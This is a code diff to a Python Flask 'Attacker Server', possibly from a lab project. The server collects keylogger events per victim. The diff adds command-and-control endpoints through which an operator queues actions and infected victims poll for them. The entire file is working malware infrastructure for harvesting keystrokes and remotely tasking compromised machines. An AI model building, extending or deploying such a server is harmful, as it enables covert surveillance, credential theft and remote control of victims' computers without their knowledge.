@@ -1,57 +1,88 @@
-# Libraries required for the web server and data handling
-from flask import Flask, request, jsonify # Flask handles routing and HTTP operations
-import json # Used to handle JSON serialization
-import os   # Used for file system operations (creating directories)
+from flask import Flask, request, jsonify
+import json, os
+import threading
+import time
 
-# Initialize the Flask application
 app = Flask(__name__)
 
-# Ensure the main storage directory exists
-# All incoming logs will be stored here.
+# Dictionary to hold pending commands for each victim
+# Clé: victim_id (str), Valeur: {"action": "...", "timestamp": ...}
+COMMANDS = {}
+# Timestamp of the last successful command execution globally
+LAST_COMMAND_TIMESTAMP = 0
+
 os.makedirs("stockage", exist_ok=True)
 
 @app.post("/log")
 def log():
-    """
-    HTTP POST endpoint to receive and store keylogger events.
-    The keylogger sends data to this endpoint.
-    """
-    # Attempt to parse the JSON data from the request body. 
-    # silent=True prevents Flask from raising an exception if the JSON is malformed.
+    """Receives and stores keylogger events."""
     data = request.get_json(silent=True)
-    
-    # Check if data parsing failed (no JSON or invalid format)
     if not data:
         return jsonify({"error": "Invalid JSON"}), 400
 
-    # Extract the victim ID, defaulting to "unknown" if missing
     victim = data.get("victim_id", "unknown")
-    
-    # Create a dedicated directory for the victim if it doesn't exist
     os.makedirs(f"stockage/{victim}", exist_ok=True)
 
-    # Define the path to the victim's log file (JSON Lines format)
     path = f"stockage/{victim}/events.jsonl"
-    
-    # Append the entire received data packet (containing events) to the log file
     with open(path, "a") as f:
         f.write(json.dumps(data) + "\n")
 
-    # Send a successful response back to the keylogger
     return jsonify({"status": "ok"}), 200
+
+# --- NOUVEL ENDPOINT POUR LE CONTRÔLE C2 ---
+@app.post("/command")
+def set_command():
+    """Endpoint accessible par le Controller pour définir une commande à exécuter."""
+    global COMMANDS, LAST_COMMAND_TIMESTAMP
+    data = request.get_json(silent=True)
+    
+    if not data or not data.get("victim_id") or not data.get("action"):
+        return jsonify({"error": "Missing victim_id or action"}), 400
+    
+    victim_id = data["victim_id"]
+    action = data["action"]
+    
+    # Store the command to be picked up by the victim later
+    COMMANDS[victim_id] = {
+        "action": action, 
+        "timestamp": time.time(),
+        "status": "pending" # New field for status
+    }
+    
+    LAST_COMMAND_TIMESTAMP = time.time()
+    print(f"[C2 Command] Command '{action}' set for victim {victim_id}.")
+    return jsonify({"status": "command_set", "action": action}), 200
+
+@app.get("/command/<victim_id>")
+def get_command(victim_id):
+    """Endpoint accessible par la Victime pour récupérer la commande en attente."""
+    global COMMANDS
+    
+    command_data = COMMANDS.get(victim_id)
+    
+    if command_data and command_data.get("status") == "pending":
+        # Return the command and mark it as "sent" (to prevent re-sending the same command)
+        COMMANDS[victim_id]["status"] = "sent" 
+        return jsonify(command_data), 200
+    
+    # If no pending command, return an empty action
+    return jsonify({"action": "none"}), 200
+
+# Endpoint to check command status (optional for controller)
+@app.get("/command_status")
+def command_status():
+    global COMMANDS, LAST_COMMAND_TIMESTAMP
+    return jsonify({
+        "commands": {k: v for k, v in COMMANDS.items() if v.get('status') == 'pending'},
+        "last_command_time": LAST_COMMAND_TIMESTAMP
+    }), 200
+# ----------------------------------------------
+
 
 @app.get("/")
 def home():
-    """
-    Simple GET endpoint for health check.
-    """
     return "Attacker Server Active"
 
-# Standard Python entry point
 if __name__ == "__main__":
-    # Run the Flask application
-    # host="0.0.0.0" is generally recommended when running on a VM 
-    # so the server is accessible from the external network/victim.
-    # NOTE: The provided code uses 127.0.0.1, which only allows access from the host itself.
-    # To be reachable by the victim, it should be changed to 0.0.0.0 or the VM's actual IP.
+    # WARNING: Use 0.0.0.0 for external access in VM environment!
     app.run(host="127.0.0.1", port=5000)
